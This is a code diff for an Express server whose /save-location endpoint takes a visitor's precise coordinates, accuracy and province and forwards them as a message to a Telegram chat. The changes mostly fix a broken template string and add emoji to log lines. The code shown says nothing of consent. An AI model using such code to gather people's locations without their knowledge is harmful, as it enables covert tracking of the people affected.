@@ -13,8 +13,8 @@ let userCounter = 1;
 app.post('/save-location', async (req, res) => {
   const { latitude, longitude, accuracy, province, timestamp } = req.body;
   const locationUrl = `https://maps.google.com/?q=${latitude},${longitude}`;
-  const message = `📍 User #${userCounter++}
-const message = `📍 ผู้ใช้งานลำดับที่ #${userCounter++} (User #${userCounter - 1})
+  const message =
+`📍 ผู้ใช้งานลำดับที่ #${userCounter} (User #${userCounter})
 🗺️ จังหวัด (Province): ${province}
 🌐 ตำแหน่ง (Location): ${locationUrl}
 📌 พิกัด (Coordinates):
@@ -23,6 +23,8 @@ const message = `📍 ผู้ใช้งานลำดับที่ #${use
 📏 ความแม่นยำ (Accuracy): ~${accuracy} เมตร (meters)
 🕒 เวลา (Time): ${new Date(timestamp).toLocaleString('th-TH', { timeZone: 'Asia/Bangkok' })}`;
 
+  userCounter++;
+
   try {
     await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
       chat_id: process.env.TELEGRAM_CHAT_ID,
@@ -30,7 +32,7 @@ const message = `📍 ผู้ใช้งานลำดับที่ #${use
     });
     res.sendStatus(200);
   } catch (error) {
-    console.error('Failed to send Telegram message:', error.response?.data || error.message);
+    console.error('❌ Failed to send Telegram message:', error.response?.data || error.message);
     res.status(500).send('Failed to send message');
   }
 });
@@ -41,5 +43,5 @@ app.get('*', (req, res) => {
 
 const port = process.env.PORT || 3000;
 app.listen(port, () => {
-  console.log(`Server running on http://localhost:${port}`);
+  console.log(`🚀 Server running at http://localhost:${port}`);
 });
